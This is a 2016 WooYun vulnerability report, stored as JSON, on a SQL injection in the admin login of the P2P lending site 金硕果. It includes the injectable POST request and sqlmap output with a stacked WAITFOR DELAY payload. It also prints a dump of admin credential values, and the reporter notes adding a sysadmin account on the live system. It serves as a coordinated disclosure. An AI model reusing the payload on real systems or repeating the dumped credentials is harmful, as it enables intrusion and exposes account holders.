{"id": 75809, "wybug_id": "wooyun-2016-0166357", "wybug_title": "P2P金融金硕果后台登录窗口存在sql注入（管理员账户可登陆）", "wybug_corp": "金硕果", "wybug_author": "Nelion", "wybug_date": "2016-01-03 21:44", "wybug_open_date": "2016-02-20 15:48", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["管理后台对外"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-20：\t细节向公众公开  简要描述： RT 详细说明：  深圳市道成互联网金融服务有限公司于2015年1月30日在深圳市前海注册成功，注册资金5000万，旗下金硕果平台是一家综合性的专业金融中介服务机构。金硕果网络金融咨询平台集财富管理、信用风险评估与管理、金融行业投资及交易促成平台服务等业务一体，致力于为有融资及投资需求小微企业和个人提供高效、透明、便捷的互联网金融服务。（官网介绍）1、注入点（抓的登录窗口包）：\nhttp://**.**.**.**/manage/Login.aspx\n\nPOST /manage/login.aspx HTTP/1.1Host: **.**.**.**Content-Length: 408Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://**.**.**.**Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://**.**.**.**/manage/login.aspxAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: __cfduid=d0f5159ebd5955a32afacf6b0b2a79c3c1451469313; CNZZDATA1256798750=549312653-1451469313-http%253A%252F%252F**.**.**.**%252F%7C1451469313; CNZZDATA1254630126=237372052-1451469314-http%253A%252F%252F**.**.**.**%252F%7C1451469314__VIEWSTATE=PODu1fY%2Bhx05F2Rv%2F6uVsuGHLWRpfcfT70xlVkLoAZdwsHEztWIwDxPfhUljJRb0nLCfeBCFpY1R63M%2FQa%2BQzDszP18S9uVigkOGKatK5ZM%3D&__EVENTVALIDATION=WqWlWc5X9wVpb4SrG1MRr%2FnBns55TW88mqxcxRi2T8q%2BFPP9%2FoabziYpLpLPOM3kirrIiwd6KZ7Nh0jNuvPoMHuAt4B%2B1vi%2BLc6V0xc2sFAVyTYSrK%2FANVlDsmgHpDOvfU2%2F2UB6RGNzRx8emmSeBWzu75V38WhLPd%2F3%2B29jkKI%3D&username=13777777777&password=123456&Button_OK=%E7%99%BB+%E5%BD%95\n\nsqlmap resumed the following injection point(s) from stored session:---Parameter: username (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: __VIEWSTATE=/mB5oKnvayvyRfIJSxeLtcrm7QGe49O Bl2zwd/QvWq8Sw9X5AxaDB6Y8 onYGqnI6KfGuXik8y xEPE1pmYiZkPGLPynDOKPgpCf7Om8No=&__EVENTVALIDATION=eyLoQ9NuAaT3aBynwepbWD5zTOPxTlMwiTxjtvZrCjG0AM4v0g6aip7n1B2TKAQ0vH6CmK1Gw1IY8/V1a/yIZdWw  DFIRdBgDq0bNUghQ1e0GmkFnnFuDqMwy7mHkdOC6khrGRdKROnvff92uHvHxJ/p0xPg2oho4TEiv9Mp4c=&username=13777777777';WAITFOR DELAY '0:0:5'--&password=123456&Button_OK=%E7%99%BB %E5%BD%95---do you want to exploit this SQL injection? [Y/n][11:25:43] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windowsweb application technology: ASP.NET 4.0.30319, ASP.NETback-end DBMS: Microsoft SQL Server 2012\n   漏洞证明：  2、数据库当前用户：\n\n3、所有数据库：\navailable databases [7]:[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] Y2D\n4、当前数据库是Y2D，其中的表及数据量：\nDatabase: Y2D+--------------------+---------+| Table              | Entries |+--------------------+---------+| dbo.accountRecord  | 9659    || dbo.withdrawRecord | 6861    || dbo.investRecord   | 3040    || dbo.users          | 695     || dbo.sms            | 441     || dbo.imgRecord      | 273     || dbo.userBank       | 103     || dbo.repayList      | 83      || dbo.article        | 65      || dbo.loanTarget     | 55      || dbo.userInfo       | 54      || dbo.withdrawList   | 47      || dbo.sysAdmin       | 6       || dbo.contentType    | 2       |+--------------------+---------+\n5、看一下dbo.sysAdmin这个表中的某些字段的数据：\nDatabase: Y2DTable: sysAdmin[6 entries]+------+-------------+-------+| user | adminpass   | relid |+------+-------------+-------+| dbo  | 13655418921 | <blank> || dbo  | 15098994190 | <blank> || dbo  | 15614647282 | <blank> || dbo  | 18563405315 | <blank> || dbo  | 18764009903 | <blank> || dbo  | guying1314  | <blank> |+------+-------------+-------+\n6、我们可以用中间adminpass这个字段的值来登录后台。（登录名和密码都是这个字段，即13655418921/13655418921）。我们看一下所有的系统管理员用户,最后一个Sysadmin是我自己加的:\n\n7、看一下用户信息：\n\n8、还有其他的一些审批的功能我就不说明了。毕竟我不是破坏。   修复方案：  参数过滤   版权声明：转载请注明来源 Nelion@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-01-08 17:29 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给广东分中心，由广东分中心后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}